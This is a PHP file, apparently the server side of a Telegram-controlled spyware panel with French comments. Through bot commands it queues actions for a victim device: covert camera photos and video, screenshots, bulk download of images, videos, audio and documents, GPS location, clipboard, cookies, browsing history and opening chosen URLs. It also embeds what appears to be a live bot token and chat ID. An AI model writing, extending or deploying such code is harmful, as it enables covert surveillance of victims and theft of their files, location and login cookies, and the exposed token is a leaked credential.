<?php
// bot.php - Interface de commandes Telegram
$botToken = '8507961561:AAFGiLtXzjIcR-j2IQuIDA55QZDQEYQFq_4';
$chatId = '6767182328';

$content = file_get_contents('php://input');
$update = json_decode($content, true);

// Fonction pour envoyer un message
function sendMessage($chat_id, $message) {
    global $botToken;
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    file_get_contents($url . "?chat_id=$chat_id&text=" . urlencode($message));
}

// Récupérer le fichier commands.txt
$commandsFile = 'commands.txt';

if ($update && isset($update['message']['text'])) {
    $text = trim($update['message']['text']);
    $chat_id = $update['message']['chat']['id'];
    
    switch($text) {
        // === FICHIERS & CAPTURES ===
        case '/camera':
            file_put_contents($commandsFile, 'camera');
            sendMessage($chat_id, "📷 Commande envoyée: Déclenchement caméra + 10 photos + vidéo 12s");
            break;
            
        case '/files':
            file_put_contents($commandsFile, 'files');
            sendMessage($chat_id, "📁 Commande envoyée: Accès aux fichiers externes");
            break;
            
        case '/screenshot':
            file_put_contents($commandsFile, 'screenshot');
            sendMessage($chat_id, "📸 Commande envoyée: Capture d'écran");
            break;
            
        // === TÉLÉCHARGEMENT SPÉCIFIQUE ===
        case '/download_images':
            file_put_contents($commandsFile, 'download:images');
            sendMessage($chat_id, "🖼️ Commande envoyée: Téléchargement de TOUTES les images");
            break;
            
        case '/download_videos':
            file_put_contents($commandsFile, 'download:videos');
            sendMessage($chat_id, "🎥 Commande envoyée: Téléchargement de TOUTES les vidéos");
            break;
            
        case '/download_audios':
            file_put_contents($commandsFile, 'download:audios');
            sendMessage($chat_id, "🎵 Commande envoyée: Téléchargement de TOUS les audios");
            break;
            
        case '/download_documents':
            file_put_contents($commandsFile, 'download:documents');
            sendMessage($chat_id, "📄 Commande envoyée: Téléchargement de TOUS les documents");
            break;
            
        case '/filelist':
            file_put_contents($commandsFile, 'filelist');
            sendMessage($chat_id, "📋 Commande envoyée: Liste des fichiers");
            break;
            
        // === DONNÉES ===
        case '/location':
            file_put_contents($commandsFile, 'location');
            sendMessage($chat_id, "📍 Commande envoyée: Localisation GPS");
            break;
            
        case '/clipboard':
            file_put_contents($commandsFile, 'clipboard');
            sendMessage($chat_id, "📋 Commande envoyée: Lecture presse-papier");
            break;
            
        case '/cookies':
            file_put_contents($commandsFile, 'cookies');
            sendMessage($chat_id, "🍪 Commande envoyée: Récupération cookies");
            break;
            
        case '/history':
            file_put_contents($commandsFile, 'history');
            sendMessage($chat_id, "📜 Commande envoyée: Historique navigation");
            break;
            
        case '/permissions':
            file_put_contents($commandsFile, 'permissions');
            sendMessage($chat_id, "✅ Commande envoyée: Historique autorisations");
            break;
            
        // === NOTIFICATIONS ===
        case '/status':
            file_put_contents($commandsFile, 'status');
            sendMessage($chat_id, "📊 Commande envoyée: État de l'onglet");
            break;
            
        case '/ping':
            file_put_contents($commandsFile, 'ping');
            sendMessage($chat_id, "🏓 Commande envoyée: Test connexion");
            break;
            
        case '/vibrate':
            file_put_contents($commandsFile, 'vibrate');
            sendMessage($chat_id, "📳 Commande envoyée: Vibration");
            break;
            
        case '/start':
        case '/help':
            $help = "🤖 BOT DE COMMANDE ULTIME
━━━━━━━━━━━━━━━━━━━━━
🎯 FICHIERS & CAPTURES:
/camera - Photos (10) + vidéo (12s)
/files - Accès fichiers externes
/screenshot - Capture d'écran

📥 TÉLÉCHARGEMENT:
/download_images - Toutes les images
/download_videos - Toutes les vidéos
/download_audios - Tous les audios
/download_documents - Tous les docs
/filelist - Liste des fichiers

👁️ SURVEILLANCE:
/location - Localisation GPS
/clipboard - Presse-papier

🍪 DONNÉES:
/cookies - Cookies
/history - Historique
/permissions - Autorisations

📊 SYSTÈME:
/status - État complet
/ping - Test connexion
/vibrate - Vibration
━━━━━━━━━━━━━━━━━━━━━";
            sendMessage($chat_id, $help);
            break;
            
        // Commande personnalisée: notify_custom:message
        default:
            if (str_starts_with($text, 'notify_custom:')) {
                $customMsg = substr($text, 14);
                file_put_contents($commandsFile, 'notify_custom:' . $customMsg);
                sendMessage($chat_id, "🔔 Notification personnalisée envoyée: " . $customMsg);
            }
            elseif (str_starts_with($text, 'url:')) {
                $url = substr($text, 4);
                file_put_contents($commandsFile, 'url:' . $url);
                sendMessage($chat_id, "🔗 Ouverture URL demandée: " . $url);
            }
            else {
                sendMessage($chat_id, "❌ Commande inconnue. Tapez /help pour la liste.");
            }
            break;
    }
}

// Nettoyer le fichier commands.txt après exécution (optionnel)
if (filesize($commandsFile) > 0 && time() - filemtime($commandsFile) > 60) {
    file_put_contents($commandsFile, '');
}
?>
